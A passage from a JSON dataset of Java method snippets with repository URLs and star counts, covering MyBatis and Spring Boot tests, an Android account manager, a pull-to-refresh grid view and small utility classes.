"BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 58380, "method_name": "shouldGetResultFromResultSetByPosition", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {\n    when(rs.getObject(1, LocalTime.class)).thenReturn(LOCAL_TIME);\n    assertEquals(LOCAL_TIME, TYPE_HANDLER.getResult(rs, 1));\n    verify(rs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 58381, "method_name": "shouldGetResultNullFromResultSetByPosition", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {\n    when(rs.getObject(1, LocalTime.class)).thenReturn(null);\n    assertNull(TYPE_HANDLER.getResult(rs, 1));\n    verify(rs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 58382, "method_name": "shouldGetResultFromCallableStatement", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {\n    when(cs.getObject(1, LocalTime.class)).thenReturn(LOCAL_TIME);\n    assertEquals(LOCAL_TIME, TYPE_HANDLER.getResult(cs, 1));\n    verify(cs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 58383, "method_name": "shouldGetResultNullFromCallableStatement", "class_name": "LocalTimeTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {\n    when(cs.getObject(1, LocalTime.class)).thenReturn(null);\n    assertNull(TYPE_HANDLER.getResult(cs, 1));\n    verify(cs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/LocalTimeTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 58384, "method_name": "shouldWriteValueAsString", "class_name": "JacksonUtilTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shouldWriteValueAsString() {\n        //given\n        Map<String, String> map = new HashMap<>();\n        map.put(\"aaa\", \"111\");\n        map.put(\"bbb\", \"222\");\n\n        //when\n        String json = JacksonUtil.writeValueAsString(map);\n\n        //then\n        assertThat(json, is(\"{\\\"aaa\\\":\\\"111\\\",\\\"bbb\\\":\\\"222\\\"}\"));\n    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/test/java/com/avon/rga/core/util/JacksonUtilTest.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58385, "method_name": "shouldReadValueAsObject", "class_name": "JacksonUtilTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shouldReadValueAsObject() {\n        //given\n        String jsonString = \"{\\\"aaa\\\":\\\"111\\\",\\\"bbb\\\":\\\"222\\\"}\";\n\n        //when\n        Map result = JacksonUtil.readValue(jsonString, Map.class);\n\n        //then\n        assertThat(result.get(\"aaa\"), Is.<Object>is(\"111\"));\n        assertThat(result.get(\"bbb\"), Is.<Object>is(\"222\"));\n\n    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/test/java/com/avon/rga/core/util/JacksonUtilTest.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58386, "method_name": "cleanUp", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid cleanUp() {\n\t\tif (this.context != null) {\n\t\t\tthis.context.close();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58387, "method_name": "enableProfileViaApplicationProperties", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid enableProfileViaApplicationProperties() {\n\t\t// gh-308\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tthis.context = application.run(\"--spring.config.name=enableprofileviaapplicationproperties\",\n\t\t\t\t\"--spring.profiles.active=dev\");\n\t\tassertThat(this.context.getEnvironment().acceptsProfiles(Profiles.of(\"dev\"))).isTrue();\n\t\tassertThat(this.context.getEnvironment().acceptsProfiles(Profiles.of(\"a\"))).isTrue();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58388, "method_name": "activeProfilesWithYamlAndCommandLine", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid activeProfilesWithYamlAndCommandLine() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=B\");\n\t\tassertVersionProperty(this.context, \"B\", \"B\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58389, "method_name": "activeProfilesWithYamlOnly", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid activeProfilesWithYamlOnly() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro\";\n\t\tthis.context = application.run(configName);\n\t\tassertVersionProperty(this.context, \"B\", \"B\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58390, "method_name": "orderActiveProfilesWithYamlOnly", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid orderActiveProfilesWithYamlOnly() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-ordered\";\n\t\tthis.context = application.run(configName);\n\t\tassertVersionProperty(this.context, \"B\", \"A\", \"B\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58391, "method_name": "commandLineBeatsProfilesWithYaml", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid commandLineBeatsProfilesWithYaml() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=C\");\n\t\tassertVersionProperty(this.context, \"C\", \"C\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58392, "method_name": "orderProfilesWithYaml", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid orderProfilesWithYaml() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=A,C\");\n\t\tassertVersionProperty(this.context, \"C\", \"A\", \"C\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58393, "method_name": "reverseOrderOfProfilesWithYaml", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid reverseOrderOfProfilesWithYaml() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=C,A\");\n\t\tassertVersionProperty(this.context, \"A\", \"C\", \"A\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58394, "method_name": "activeProfilesWithYamlAndCommandLineAndNoOverride", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid activeProfilesWithYamlAndCommandLineAndNoOverride() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-without-override\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=B\");\n\t\tassertVersionProperty(this.context, \"B\", \"B\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58395, "method_name": "activeProfilesWithYamlOnlyAndNoOverride", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid activeProfilesWithYamlOnlyAndNoOverride() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-without-override\";\n\t\tthis.context = application.run(configName);\n\t\tassertVersionProperty(this.context, null);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58396, "method_name": "commandLineBeatsProfilesWithYamlAndNoOverride", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid commandLineBeatsProfilesWithYamlAndNoOverride() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-without-override\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=C\");\n\t\tassertVersionProperty(this.context, \"C\", \"C\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58397, "method_name": "orderProfilesWithYamlAndNoOverride", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid orderProfilesWithYamlAndNoOverride() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-without-override\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=A,C\");\n\t\tassertVersionProperty(this.context, \"C\", \"A\", \"C\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58398, "method_name": "reverseOrderOfProfilesWithYamlAndNoOverride", "class_name": "ReproTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid reverseOrderOfProfilesWithYamlAndNoOverride() {\n\t\t// gh-322, gh-342\n\t\tSpringApplication application = new SpringApplication(Config.class);\n\t\tapplication.setWebApplicationType(WebApplicationType.NONE);\n\t\tString configName = \"--spring.config.name=activeprofilerepro-without-override\";\n\t\tthis.context = application.run(configName, \"--spring.profiles.active=C,A\");\n\t\tassertVersionProperty(this.context, \"A\", \"C\", \"A\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58399, "method_name": "assertVersionProperty", "class_name": "ReproTests", "params": ["ConfigurableApplicationContext", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void assertVersionProperty(ConfigurableApplicationContext context, String expectedVersion,\n\t\t\tString... expectedActiveProfiles) {\n\t\tassertThat(context.getEnvironment().getActiveProfiles()).isEqualTo(expectedActiveProfiles);\n\t\tassertThat(context.getEnvironment().getProperty(\"version\")).as(\"version mismatch\").isEqualTo(expectedVersion);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot/src/test/java/org/springframework/boot/ReproTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58400, "method_name": "authenticatorMissing", "class_name": "DatabaseAccountManager", "params": ["String"], "throws": null, "modifiers": ["static", "private"], "return_type": "Bundle", "snippet": "    private static Bundle authenticatorMissing(String accountType) {\n        Bundle result = new Bundle();\n        result.putInt(KEY_ERROR_CODE, ERROR_CODE_BAD_ARGUMENTS);\n        result.putString(KEY_ERROR_MESSAGE, \"unknown account type: \" + accountType);\n        return result;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 58401, "method_name": "getAuthenticator", "class_name": "DatabaseAccountManager", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "DatabaseAuthenticator", "snippet": "    private DatabaseAuthenticator getAuthenticator(String type) {\n        DatabaseAuthenticator authenticator = mAuthenticators.get(type);\n        if (authenticator != null && SDK <= authenticator.getMaxSdkVersion()) {\n            return authenticator;\n        } else {\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 58402, "method_name": "getAccountsByType", "class_name": "DatabaseAccountManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Account", "snippet": "    public Account[] getAccountsByType(String type) {\n        DatabaseAuthenticator authenticator = getAuthenticator(type);\n        if (authenticator != null) {\n            return authenticator.getAccountsByType(type);\n        } else if (mStandardAccountManager != null) {\n            return mStandardAccountManager.getAccountsByType(type);\n        } else {\n            return new Account[0];\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 58403, "method_name": "getAccountsByTypeAndFeatures", "class_name": "DatabaseAccountManager", "params": ["String", "String", "AccountManagerCallback<Account>", "Handler"], "throws": null, "modifiers": ["public"], "return_type": "AccountManagerFuture<Account>", "snippet": "    public AccountManagerFuture<Account[]> getAccountsByTypeAndFeatures(final String type,\n            final String[] features, AccountManagerCallback<Account[]> callback, Handler handler) {\n        final DatabaseAuthenticator authenticator = getAuthenticator(type);\n        if (authenticator != null || mStandardAccountManager == null) {\n            return new Future2Task<Account[]>(new Callable<Account[]>() {\n                public Account[] call() {\n                    if (authenticator != null) {\n                        return authenticator.getAccountsByTypeAndFeatures(type, features);\n                    } else {\n                        return new Account[0];\n                    }\n                }\n            }, handler, callback).start();\n        } else {\n            return mStandardAccountManager.getAccountsByTypeAndFeatures(type, features, callback,\n                    handler);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 58404, "method_name": "getAuthToken", "class_name": "DatabaseAccountManager", "params": ["Account", "String", "boolean", "AccountManagerCallback<Bundle>", "Handler"], "throws": null, "modifiers": ["public"], "return_type": "AccountManagerFuture<Bundle>", "snippet": "    public AccountManagerFuture<Bundle> getAuthToken(final Account account,\n            final String authTokenType, boolean notifyAuthFailure,\n            AccountManagerCallback<Bundle> callback, Handler handler) {\n        final DatabaseAuthenticator authenticator = getAuthenticator(account.type);\n        if (authenticator != null || mStandardAccountManager == null) {\n            return new Future2Task<Bundle>(new Callable<Bundle>() {\n                public Bundle call() {\n                    if (authenticator != null) {\n                        return authenticator.getAuthToken(account, authTokenType, null);\n                    } else {\n                        return authenticatorMissing(account.type);\n                    }\n                }\n            }, handler, callback).start();\n        } else {\n            return mStandardAccountManager.getAuthToken(account, authTokenType, notifyAuthFailure,\n                    callback, handler);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 58405, "method_name": "addAccount", "class_name": "DatabaseAccountManager", "params": ["String", "String", "String", "Bundle", "Void", "AccountManagerCallback<Bundle>", "Handler"], "throws": null, "modifiers": ["public"], "return_type": "AccountManagerFuture<Bundle>", "snippet": "    public AccountManagerFuture<Bundle> addAccount(final String accountType,\n            final String authTokenType, final String[] requiredFeatures,\n            final Bundle addAccountOptions, Void activity, AccountManagerCallback<Bundle> callback,\n            Handler handler) {\n        if (activity != null) {\n            throw new RuntimeException(\"Activity parameter is not supported\");\n        }\n        final DatabaseAuthenticator authenticator = getAuthenticator(accountType);\n        if (authenticator != null || mStandardAccountManager == null) {\n            return new Future2Task<Bundle>(new Callable<Bundle>() {\n                public Bundle call() {\n                    if (authenticator != null) {\n                        return authenticator.addAccount(accountType, authTokenType,\n                                requiredFeatures, addAccountOptions);\n                    } else {\n                        return authenticatorMissing(accountType);\n                    }\n                }\n            }, handler, callback).start();\n        } else {\n            return mStandardAccountManager.addAccount(accountType, authTokenType, requiredFeatures,\n                    addAccountOptions, activity, callback, handler);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 58406, "method_name": "addAccountExplicitly", "class_name": "DatabaseAccountManager", "params": ["Account", "String", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean addAccountExplicitly(Account account, String password, Bundle userdata) {\n        DatabaseAuthenticator authenticator = getAuthenticator(account.type);\n        if (authenticator != null) {\n            return authenticator.addAccountExplicitly(account, password, userdata);\n        } else if (mStandardAccountManager != null) {\n            return mStandardAccountManager.addAccountExplicitly(account, password, userdata);\n        } else {\n            return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 58407, "method_name": "removeAccount", "class_name": "DatabaseAccountManager", "params": ["Account", "AccountManagerCallback<Boolean>", "Handler"], "throws": null, "modifiers": ["public"], "return_type": "AccountManagerFuture<Boolean>", "snippet": "    public AccountManagerFuture<Boolean> removeAccount(final Account account,\n            AccountManagerCallback<Boolean> callback, Handler handler) {\n        final DatabaseAuthenticator authenticator = getAuthenticator(account.type);\n        if (authenticator != null || mStandardAccountManager == null) {\n            return new Future2Task<Boolean>(new Callable<Boolean>() {\n                public Boolean call() {\n                    DatabaseAuthenticator authenticator = getAuthenticator(account.type);\n                    if (authenticator != null) {\n                        return authenticator.removeAccount(account);\n                    } else {\n                        return false;\n                    }\n                }\n            }, handler, callback).start();\n        } else {\n            return mStandardAccountManager.removeAccount(account, callback, handler);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 58408, "method_name": "invalidateAuthToken", "class_name": "DatabaseAccountManager", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void invalidateAuthToken(String accountType, String authToken) {\n        DatabaseAuthenticator authenticator = getAuthenticator(accountType);\n        if (authenticator != null) {\n            authenticator.invalidateAuthToken(accountType, authToken);\n        } else if (mStandardAccountManager != null) {\n            mStandardAccountManager.invalidateAuthToken(accountType, authToken);\n        } else {\n            // Do nothing\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/DatabaseAccountManager.java", "stars": "74", "class_props": {"extends": "AccountManager", "implements": null, "modifiers": []}}, {"id": 58409, "method_name": "criaCielo", "class_name": "ProcessadoresPagamentoFactory", "params": ["AutorizadorDeTransacoes"], "throws": null, "modifiers": ["public"], "return_type": "ProcessadorPagamento", "snippet": "\tpublic ProcessadorPagamento criaCielo(AutorizadorDeTransacoes autorizadorDeTransacoes) {\n\t\treturn new ProcessadorCielo(autorizadorDeTransacoes); \n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/ProcessadoresPagamentoFactory.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58410, "method_name": "criaRede", "class_name": "ProcessadoresPagamentoFactory", "params": ["AutorizadorDeTransacoes"], "throws": null, "modifiers": ["public"], "return_type": "ProcessadorPagamento", "snippet": "\tpublic ProcessadorPagamento criaRede(AutorizadorDeTransacoes autorizadorDeTransacoes) {\n\t\treturn new ProcessadorRede(autorizadorDeTransacoes); \n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/ProcessadoresPagamentoFactory.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58411, "method_name": "main", "class_name": "Sortierung", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        // Eingabe:\n        int[] zuSortieren = {12, 14, 125, 1, 9, 28, 3};\n        // Ausgabe: Sortierte Liste\n    }", "url": "https://raw.githubusercontent.com/unterstein/dhbw-java-2020/master/src/Sortierung.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58412, "method_name": "getPullToRefreshScrollDirection", "class_name": "PullToRefreshGridView", "params": [], "throws": null, "modifiers": ["final", "public"], "return_type": "Orientation", "snippet": "\tpublic final Orientation getPullToRefreshScrollDirection() {\n\t\treturn Orientation.VERTICAL;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshGridView.java", "stars": "74", "class_props": {"extends": "PullToRefreshAdapterViewBase", "implements": null, "modifiers": ["public"]}}, {"id": 58413, "method_name": "createRefreshableView", "class_name": "PullToRefreshGridView", "params": ["Context", "AttributeSet"], "throws": null, "modifiers": ["final", "protected"], "return_type": "GridView", "snippet": "\tprotected final GridView createRefreshableView(Context context, AttributeSet attrs) {\n\t\tfinal GridView gv;\n\t\tif (VERSION.SDK_INT >= VERSION_CODES.GINGERBREAD) {\n\t\t\tgv = new InternalGridViewSDK9(context, attrs);\n\t\t} else {\n\t\t\tgv = new InternalGridView(context, attrs);\n\t\t}\n\n\t\t// Use Generated ID (from res/values/ids.xml)\n\t\tgv.setId(R.id.gridview);\n\t\treturn gv;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshGridView.java", "stars": "74", "class_props": {"extends": "PullToRefreshAdapterViewBase", "implements": null, "modifiers": ["public"]}}, {"id": 58414, "method_name": "setEmptyView", "class_name": "InternalGridView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setEmptyView(View emptyView) {\n\t\t\tPullToRefreshGridView.this.setEmptyView(emptyView);\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshGridView.java", "stars": "74", "class_props": {"extends": "GridView", "implements": ["EmptyViewMethodAccessor"], "modifiers": []}}, {"id": 58415, "method_name": "setEmptyViewInternal", "class_name": "InternalGridView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setEmptyViewInternal(View emptyView) {\n\t\t\tsuper.setEmptyView(emptyView);\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshGridView.java", "stars": "74", "class_props": {"extends": "GridView", "implements": ["EmptyViewMethodAccessor"], "modifiers": []}}, {"id": 58416, "method_name": "overScrollBy", "class_name": "InternalGridViewSDK9", "params": ["int", "int", "int", "int", "int", "int", "int", "int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\t\tprotected boolean overScrollBy(int deltaX, int deltaY, int scrollX, int scrollY, int scrollRangeX,\n\t\t\t\tint scrollRangeY, int maxOverScrollX, int maxOverScrollY, boolean isTouchEvent) {\n\n\t\t\tfinal boolean returnValue = super.overScrollBy(deltaX, deltaY, scrollX, scrollY, scrollRangeX,\n\t\t\t\t\tscrollRangeY, maxOverScrollX, maxOverScrollY, isTouchEvent);\n\n\t\t\t// Does all of the hard work...\n\t\t\tOverscrollHelper.overScrollBy(PullToRefreshGridView.this, deltaX, scrollX, deltaY, scrollY, isTouchEvent);\n\n\t\t\treturn returnValue;\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshGridView.java", "stars": "74", "class_props": {"extends": "InternalGridView", "implements": null, "modifiers": ["final"]}}, {"id": 58417, "method_name": "getGlobalData", "class_name": "CovidDataModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GlobalData", "snippet": "    public GlobalData getGlobalData() {\n        return globalData;\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/datafetch/model/CovidDataModel.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58418, "method_name": "getCountryData", "class_name": "CovidDataModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CountryData", "snippet": "    public CountryData getCountryData() {\n        return countryData;\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/datafetch/model/CovidDataModel.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58419, "method_name": "toString", "class_name": "CovidDataModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"CovidDataModel{\" +\n                \"globalData=\" + globalData +\n                \", countryData=\" + countryData +\n                '}';\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/datafetch/model/CovidDataModel.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58420, "method_name": "onCreate", "class_name": "ShopsDatabase", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_shop_approals);\n        ButterKnife.bind(this);\n\n        